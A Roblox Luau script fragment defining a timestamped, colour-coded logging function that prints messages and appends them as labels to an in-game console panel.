-- §5  LOGGING  (NOTE: does NOT shadow the 'makeLabel' helper below)
-- ═══════════════════════════════════════════════════════════════════════

local function ts()
    local t = os.date("*t")
    return ("%02d:%02d:%02d"):format(t.hour, t.min, t.sec)
end

local LOG_COLORS = {
    INFO=Color3.fromRGB(99,102,241), WARN=Color3.fromRGB(234,179,8),
    CRIT=Color3.fromRGB(239,68,68),  OK  =Color3.fromRGB(34,197,94),
    EXEC=Color3.fromRGB(99,102,241), SYS =Color3.fromRGB(155,155,190),
    FUZZ=Color3.fromRGB(168,85,247),
}

local function log(level, msg)
    msg = tostring(msg)
    print(("[SSv4][%s][%s] %s"):format(ts(), level, msg))
    if not ConsoleList then return end
    local color = LOG_COLORS[level] or Color3.fromRGB(238,238,255)
    local row = Instance.new("Frame")
    row.Size = UDim2.new(1,-8,0,17)
    row.BackgroundTransparency = 1
    row.Parent = ConsoleList
    local entry = Instance.new("TextLabel")   -- NOTE: named 'entry', NOT 'lbl'
    entry.Size = UDim2.new(1,0,1,0)
    entry.BackgroundTransparency = 1
    entry.TextColor3 = color
    entry.Font = Enum.Font.Code
    entry.TextSize = 11
    entry.TextXAlignment = Enum.TextXAlignment.Left
    entry.TextTruncate = Enum.TextTruncate.AtEnd
    entry.Text = ("[%s][%s] %s"):format(ts(), level, msg)
    entry.Parent = row
    task.defer(function()
        local scr = ConsoleList.Parent
        if scr and scr:IsA("ScrollingFrame") then
            scr.CanvasPosition = Vector2.new(0, math.huge)
        end
    end)
end

